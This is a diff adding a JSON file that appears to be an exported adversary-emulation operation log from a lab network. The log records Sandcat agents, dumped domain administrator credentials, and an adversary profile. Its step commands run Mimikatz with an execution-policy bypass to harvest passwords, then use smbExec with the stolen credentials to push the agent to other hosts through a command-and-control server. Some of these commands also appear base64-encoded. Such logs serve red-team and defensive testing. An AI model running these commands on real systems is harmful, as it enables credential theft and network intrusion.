@@ -1,0 +1,458 @@
+{
+    "name": "test1",
+    "id": 3,
+    "host_group": [
+        {
+            "id": 1,
+            "paw": "kali$root",
+            "last_seen": "2020-02-25 21:40:24",
+            "architecture": "amd64",
+            "platform": "linux",
+            "server": "http://192.168.1.250:8888",
+            "host_group": "my_group",
+            "location": "/tmp/sandcat-linux",
+            "pid": 28829,
+            "ppid": 27776,
+            "trusted": 1,
+            "last_trusted_seen": "2020-02-25 21:40:24",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "sh",
+                    "preferred": 1
+                },
+                {
+                    "executor": "pwsh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        },
+        {
+            "id": 2,
+            "paw": "WIN7$TESTDOMAIN\\Administrator",
+            "last_seen": "2020-02-25 21:40:25",
+            "architecture": "amd64",
+            "platform": "windows",
+            "server": "http://192.168.1.250:8888",
+            "host_group": "my_group",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "pid": 624,
+            "ppid": 480,
+            "trusted": 1,
+            "last_trusted_seen": "2020-02-25 21:40:25",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        },
+        {
+            "id": 3,
+            "paw": "DomainControl$TESTDOMAIN\\Administrator",
+            "last_seen": "2020-02-25 21:40:21",
+            "architecture": "amd64",
+            "platform": "windows",
+            "server": "http://192.168.1.250:8888",
+            "host_group": "my_group",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "pid": 708,
+            "ppid": 3428,
+            "trusted": 1,
+            "last_trusted_seen": "2020-02-25 21:40:21",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2020-02-25 21:39:37",
+    "facts": [
+        {
+            "id": 8,
+            "property": "file.sensitive.extension",
+            "value": "txt",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 9,
+            "property": "file.sensitive.extension",
+            "value": "yml",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 10,
+            "property": "host.service.modifiable",
+            "value": "fax",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 11,
+            "property": "target.org.name",
+            "value": "mitre.org",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 16,
+            "property": "remote.host.ip",
+            "value": "192.168.1.107",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 17,
+            "property": "remote.host.ip",
+            "value": "192.168.1.10",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 18,
+            "property": "remote.service.smb",
+            "value": "192.168.1.107:445",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 21,
+            "property": "remote.service.smb",
+            "value": "192.168.1.10:445",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 24,
+            "property": "domain.user.password",
+            "value": "TESTDOMAIN:Administrator:Tartans@1",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 7
+        },
+        {
+            "id": 25,
+            "property": "domain.user.password",
+            "value": "TESTDOMAIN.CMU:Administrator:Tartans@1",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 7
+        }
+    ],
+    "finish": "2020-02-25 21:40:26",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 26,
+        "adversary_id": "d769e33e-a8bb-458d-93b8-123e285c28aa",
+        "name": "mimi_domain",
+        "description": "mimikatz and domain smb",
+        "phases": {
+            "1": [
+                {
+                    "id": 107,
+                    "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+                    "tactic": "credential-access",
+                    "technique_name": "Credential Dumping",
+                    "technique_id": "T1003",
+                    "name": "Run Mimikatz",
+                    "test": "cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLWNvbW1hbmQgIi4gLlxJbnZva2UtTWltaWthdHoucHMxIDsgSW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHMiIHwgLi9wYXJzZS1taW1pa2F0ei5wczE=",
+                    "description": "Use powershell to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 107,
+                            "name": "line",
+                            "property": "domain.user.password",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 107,
+                            "payload": "Invoke-Mimikatz.ps1, parse-mimikatz.ps1"
+                        }
+                    ],
+                    "adversary_map_id": 115
+                }
+            ],
+            "2": [
+                {
+                    "id": 186,
+                    "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat with Domain Creds (SMB)",
+                    "test": "Y2htb2QgK3ggc21iRXhlYy5lbGYgJiYKLi9zbWJFeGVjLmVsZiAtLXRhcmdldCAje3JlbW90ZS5zZXJ2aWNlLnNtYn0gLS1kb21haW5fY3JlZCAje2RvbWFpbi51c2VyLnBhc3N3b3JkfSAtLXNlcnZlciAje3NlcnZlcn0=",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 186,
+                            "payload": "smbExec.elf"
+                        }
+                    ],
+                    "adversary_map_id": 116
+                },
+                {
+                    "id": 185,
+                    "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat with Domain Creds (SMB)",
+                    "test": "Li9zbWJFeGVjLmVsZiAtLXRhcmdldCAje3JlbW90ZS5zZXJ2aWNlLnNtYn0gLS1kb21haW5fY3JlZCAje2RvbWFpbi51c2VyLnBhc3N3b3JkfSAtLXNlcnZlciAje3NlcnZlcn0=",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 185,
+                            "payload": "smbExec.elf"
+                        }
+                    ],
+                    "adversary_map_id": 116
+                },
+                {
+                    "id": 188,
+                    "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat with Domain Creds (SMB)",
+                    "test": "c21iRXhlYy5leGUgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zbWJ9IC0tZG9tYWluX2NyZWQgI3tkb21haW4udXNlci5wYXNzd29yZH0gLS1zZXJ2ZXIgI3tzZXJ2ZXJ9",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 188,
+                            "payload": "smbExec.exe"
+                        }
+                    ],
+                    "adversary_map_id": 116
+                },
+                {
+                    "id": 187,
+                    "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat with Domain Creds (SMB)",
+                    "test": "Li9zbWJFeGVjLmV4ZSAtLXRhcmdldCAje3JlbW90ZS5zZXJ2aWNlLnNtYn0gLS1kb21haW5fY3JlZCAje2RvbWFpbi51c2VyLnBhc3N3b3JkfSAtLXNlcnZlciAje3NlcnZlcn0=",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 187,
+                            "payload": "smbExec.exe"
+                        }
+                    ],
+                    "adversary_map_id": 116
+                }
+            ]
+        }
+    },
+    "jitter": "4/8",
+    "steps": [
+        {
+            "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+            "paw": "WIN7$TESTDOMAIN\\Administrator",
+            "command": "powershell.exe -executionpolicy bypass -command \". .\\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -DumpCreds\" | ./parse-mimikatz.ps1",
+            "delegated": "2020-02-25 21:39:39.072058",
+            "run": "2020-02-25 21:39:46",
+            "status": 0,
+            "description": "Use powershell to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+            "name": "Run Mimikatz",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Credential Dumping",
+                "technique_id": "T1003"
+            }
+        },
+        {
+            "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+            "paw": "kali$root",
+            "command": "./smbExec.elf --target 192.168.1.107:445 --domain_cred TESTDOMAIN:Administrator:Tartans@1 --server http://192.168.1.250:8888",
+            "delegated": "2020-02-25 21:39:55.914872",
+            "run": "2020-02-25 21:39:59",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat with Domain Creds (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+            "paw": "kali$root",
+            "command": "./smbExec.elf --target 192.168.1.107:445 --domain_cred TESTDOMAIN.CMU:Administrator:Tartans@1 --server http://192.168.1.250:8888",
+            "delegated": "2020-02-25 21:39:55.916357",
+            "run": "2020-02-25 21:40:08",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat with Domain Creds (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+            "paw": "kali$root",
+            "command": "./smbExec.elf --target 192.168.1.10:445 --domain_cred TESTDOMAIN:Administrator:Tartans@1 --server http://192.168.1.250:8888",
+            "delegated": "2020-02-25 21:39:55.916923",
+            "run": "2020-02-25 21:40:16",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat with Domain Creds (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+            "paw": "kali$root",
+            "command": "./smbExec.elf --target 192.168.1.10:445 --domain_cred TESTDOMAIN.CMU:Administrator:Tartans@1 --server http://192.168.1.250:8888",
+            "delegated": "2020-02-25 21:39:55.917309",
+            "run": "2020-02-25 21:40:24",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat with Domain Creds (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+            "paw": "WIN7$TESTDOMAIN\\Administrator",
+            "command": "smbExec.exe --target 192.168.1.107:445 --domain_cred TESTDOMAIN:Administrator:Tartans@1 --server http://192.168.1.250:8888",
+            "delegated": "2020-02-25 21:39:55.236603",
+            "run": "2020-02-25 21:39:56",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat with Domain Creds (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+            "paw": "WIN7$TESTDOMAIN\\Administrator",
+            "command": "smbExec.exe --target 192.168.1.107:445 --domain_cred TESTDOMAIN.CMU:Administrator:Tartans@1 --server http://192.168.1.250:8888",
+            "delegated": "2020-02-25 21:39:55.237181",
+            "run": "2020-02-25 21:40:01",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat with Domain Creds (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+            "paw": "WIN7$TESTDOMAIN\\Administrator",
+            "command": "smbExec.exe --target 192.168.1.10:445 --domain_cred TESTDOMAIN:Administrator:Tartans@1 --server http://192.168.1.250:8888",
+            "delegated": "2020-02-25 21:39:55.237497",
+            "run": "2020-02-25 21:40:08",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat with Domain Creds (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+            "paw": "WIN7$TESTDOMAIN\\Administrator",
+            "command": "smbExec.exe --target 192.168.1.10:445 --domain_cred TESTDOMAIN.CMU:Administrator:Tartans@1 --server http://192.168.1.250:8888",
+            "delegated": "2020-02-25 21:39:55.237760",
+            "run": "2020-02-25 21:40:11",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat with Domain Creds (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        }
+    ]
+}
